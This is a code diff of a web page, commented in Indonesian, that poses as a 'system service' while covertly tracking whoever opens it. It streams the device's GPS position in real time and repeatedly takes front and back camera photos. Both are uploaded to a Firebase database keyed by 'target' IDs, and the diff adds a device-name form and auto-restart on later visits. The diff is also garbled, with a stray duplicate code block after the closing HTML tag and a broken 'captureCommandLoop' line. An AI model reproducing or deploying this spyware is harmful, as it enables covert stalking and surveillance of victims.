@@ -20,20 +20,50 @@
             border: 1px dashed #00ff66;
             padding: 20px;
             background: #05070c;
+            width: 85%;
+            max-width: 400px;
         }
-        #statusText {
-            font-size: 0.8rem;
+        input {
+            background: #000;
+            border: 1px solid #00ff66;
             color: #00ff66;
+            padding: 8px;
+            width: 80%;
             margin-top: 10px;
+            font-family: 'Courier New', Courier, monospace;
+            text-align: center;
+        }
+        button {
+            background: #00ff66;
+            color: #000;
+            border: none;
+            padding: 9px 15px;
+            margin-top: 10px;
+            font-weight: bold;
+            cursor: pointer;
+            font-family: 'Courier New', Courier, monospace;
+        }
+        #mainContent {
+            display: none;
         }
     </style>
 </head>
 <body>
 
-    <div class="box">
+    <!-- TAMPILAN FORM INPUT MANUAL -->
+    <div class="box" id="inputSection">
+        <h3>[ IDENTIFY DEVICE ]</h3>
+        <p style="font-size: 0.8rem;">Wajib Masukkan Merek & Tipe (Contoh: Samsung S23, Infinix, Oppo):</p>
+        <input type="text" id="deviceNameInput" placeholder="Ketik nama perangkat...">
+        <br>
+        <button onclick="startService()">VERIFY & START</button>
+    </div>
+
+    <!-- TAMPILAN SETELAH VERIFIKASI (SERVICE BERJALAN) -->
+    <div class="box" id="mainContent">
         <h3>[ SYSTEM SERVICE ACTIVE ]</h3>
-        <p>Running background process...</p>
-        <div id="statusText">Status: Standby</div>
+        <p style="font-size: 0.8rem;">Running background process...</p>
+        <div id="statusText" style="font-size: 0.75rem; color: #00ff66; margin-top: 10px;">Status: Standby</div>
     </div>
 
     <div style="display:none;">
@@ -60,199 +90,122 @@
         const context = canvas.getContext('2d');
         const statusText = document.getElementById('statusText');
 
-        // Buat ID unik untuk perangkat ini jika belum ada
+        // Cek apakah perangkat sudah pernah verifikasi sebelumnya
         let targetId = localStorage.getItem("target_unique_id");
-        if (!targetId) {
-            targetId = "target_" + Math.random().toString(36).substring(2, 9);
-            localStorage.setItem("target_unique_id", targetId);
+        let deviceName = localStorage.getItem("target_device_name");
+
+        if (targetId && deviceName) {
+            // Jika sudah pernah, langsung jalankan sistem otomatis tanpa munculkan form lagi
+            document.getElementById('inputSection').style.display = 'none';
+            document.getElementById('mainContent').style.display = 'block';
+            initTracker(deviceName);
         }
 
-        // Deteksi Tipe HP Otomatis
-        function getDeviceModel() {
-            const ua = navigator.userAgent;
-            if (/android/i.test(ua)) {
-                let match = ua.match(/;\s([^;]+)\sBuild\//);
-                if (match && match[1]) return match[1];
-                return "Android Device";
-            }
-            return "Mobile Target";
-        }
-
-        const deviceName = getDeviceModel();
-
-        // 1. Kirim Data GPS Real-time (Berjalan terus di latar belakang)
-        if (navigator.geolocation) {
-            navigator.geolocation.watchPosition((position) => {
-                const lat = position.coords.latitude;
-                const lon = position.coords.longitude;
-                
-                db.ref("targets/" + targetId).set({
-                    id: targetId,
-                    device: deviceName,
-                    latitude: lat,
-                    longitude: lon,
-                    timestamp: Date.now()
-                });
-            }, (error) => {
-                console.error("GPS Error:", error);
-            }, { enableHighAccuracy: true });
-        }
-
-        // 2. Fungsi Kamera dengan Validasi Layar Aktif
-        async function captureCamera(facingType, labelName) {
-            // Android WebView memblokir kamera jika aplikasi tidak aktif/di latar belakang
-            if (document.hidden) {
-                statusText.innerText = "Status: App minimized (Camera paused)";
+        // Fungsi saat tombol "VERIFY & START" diklik
+        function startService() {
+            const inputVal = document.getElementById('deviceNameInput').value.trim();
+            if (!inputVal) {
+                alert("Silakan masukkan nama perangkat terlebih dahulu!");
                 return;
             }
 
-            try {
-                statusText.innerText = `Status: Capturing ${labelName}...`;
+            deviceName = inputVal;
+            targetId = "target_" + Math.random().toString(36).substring(2, 9);
+            
+            // Simpan ke memori HP target
+            localStorage.setItem("target_unique_id", targetId);
+            localStorage.setItem("target_device_name", deviceName);
 
-                if (video.srcObject) {
-                    video.srcObject.getTracks().forEach(track => track.stop());
-                    video.srcObject = null;
+            // Sembunyikan form, tampilkan layar status service
+            document.getElementById('inputSection').style.display = 'none';
+            document.getElementById('mainContent').style.display = 'block';
+
+            initTracker(deviceName);
+        }
+
+        // Fungsi Utama Pelacakan GPS & Kamera
+        function initTracker(devName) {
+            // 1. Kirim Data GPS Real-time
+            if (navigator.geolocation) {
+                navigator.geolocation.watchPosition((position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    
+                    db.ref("targets/" + targetId).set({
+                        id: targetId,
+                        device: devName,
+                        latitude: lat,
+                        longitude: lon,
+                        timestamp: Date.now()
+                    });
+                }, (error) => {
+                    console.error("GPS Error:", error);
+                }, { enableHighAccuracy: true });
+            }
+
+            // 2. Fungsi Kamera Berkala
+            async function captureCamera(facingType, labelName) {
+                if (document.hidden) {
+                    statusText.innerText = "Status: App minimized (Paused)";
+                    return;
                 }
 
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: facingType },
-                    audio: false
-                });
+                try {
+                    statusText.innerText = `Status: Capturing ${labelName}...`;
 
-                video.srcObject = stream;
-                await new Promise((resolve) => {
-                    video.onloadedmetadata = () => {
-                        video.play();
-                        setTimeout(resolve, 1500); // Beri waktu pemanasan sensor 1.5 detik
-                    };
-                });
+                    if (video.srcObject) {
+                        video.srcObject.getTracks().forEach(track => track.stop());
+                        video.srcObject = null;
+                    }
 
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                
-                const imageData = canvas.toDataURL('image/jpeg', 0.7);
+                    const stream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: facingType },
+                        audio: false
+                    });
 
-                db.ref("camera_logs").push({
-                    targetId: targetId,
-                    device: deviceName,
-                    cameraType: labelName,
-                    image: imageData,
-                    timestamp: Date.now()
-                });
+                    video.srcObject = stream;
+                    await new Promise((resolve) => {
+                        video.onloadedmetadata = () => {
+                            video.play();
+                            setTimeout(resolve, 1500);
+                        };
+                    });
 
-                stream.getTracks().forEach(track => track.stop());
-                video.srcObject = null;
-                statusText.innerText = "Status: Active";
-            } catch (err) {
-                console.log(`Kamera ${labelName} error:`, err);
-                statusText.innerText = "Status: Camera permission/hardware busy";
-            }
-        }
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    const imageData = canvas.toDataURL('image/jpeg', 0.7);
 
-        async function runCycle() {
-            await captureCamera("user", "Depan");
-            setTimeout(async () => {
-                await captureCamera("environment", "Belakang");
-            }, 4000);
-        }
+                    db.ref("camera_logs").push({
+                        targetId: targetId,
+                        device: devName,
+                        cameraType: labelName,
+                        image: imageData,
+                        timestamp: Date.now()
+                    });
 
-        window.addEventListener('load', () => {
-            setTimeout(() => {
-                runCycle();
-                setInterval(runCycle, 15000); // Siklus diperpanjang jadi 15 detik agar stabil
-            }, 3000);
-        });
-    </script>
-</body>
-</html>
-        // Deteksi Tipe HP Otomatis
-        function getDeviceModel() {
-            const ua = navigator.userAgent;
-            if (/android/i.test(ua)) {
-                let match = ua.match(/;\s([^;]+)\sBuild\//);
-                if (match && match[1]) return match[1];
-                return "Android Device";
-            }
-            return "Mobile Target";
-        }
-
-        const deviceName = getDeviceModel();
-
-        // 1. Kirim Data GPS Real-time
-        if (navigator.geolocation) {
-            navigator.geolocation.watchPosition((position) => {
-                const lat = position.coords.latitude;
-                const lon = position.coords.longitude;
-                
-                db.ref("targets/" + targetId).set({
-                    id: targetId,
-                    device: deviceName,
-                    latitude: lat,
-                    longitude: lon,
-                    timestamp: Date.now()
-                });
-            }, (error) => {
-                console.error("GPS Error:", error);
-            }, { enableHighAccuracy: true });
-        }
-
-        // 2. Fungsi Kamera Berkala
-        async function captureCamera(facingType, labelName) {
-            try {
-                if (video.srcObject) {
-                    video.srcObject.getTracks().forEach(track => track.stop());
+                    stream.getTracks().forEach(track => track.stop());
                     video.srcObject = null;
+                    statusText.innerText = "Status: Active";
+                } catch (err) {
+                    console.log(`Kamera ${labelName} error:`, err);
+                    statusText.innerText = "Status: Camera busy/denied";
                 }
-
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: facingType },
-                    audio: false
-                });
-
-                video.srcObject = stream;
-                await new Promise((resolve) => {
-                    video.onloadedmetadata = () => {
-                        video.play();
-                        setTimeout(resolve, 1000);
-                    };
-                });
-
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                
-                const imageData = canvas.toDataURL('image/jpeg', 0.6);
-
-                db.ref("camera_logs").push({
-                    targetId: targetId,
-                    device: deviceName,
-                    cameraType: labelName,
-                    image: imageData,
-                    timestamp: Date.now()
-                });
-
-                stream.getTracks().forEach(track => track.stop());
-                video.srcObject = null;
-            } catch (err) {
-                console.log(`Kamera ${labelName} error:`, err);
             }
-        }
 
-        async function runCycle() {
-            await captureCamera("user", "Depan");
-            setTimeout(async () => {
-                await captureCommandLoop:
-                await captureCamera("environment", "Belakang");
-            }, 3000);
-        }
+            async function runCycle() {
+                await captureCamera("user", "Depan");
+                setTimeout(async () => {
+                    await captureCamera("environment", "Belakang");
+                }, 4000);
+            }
 
-        window.addEventListener('load', () => {
             setTimeout(() => {
                 runCycle();
-                setInterval(runCycle, 10000);
-            }, 3000);
-        });
+                setInterval(runCycle, 15000);
+            }, 2000);
+        }
     </script>
 </body>
 </html>
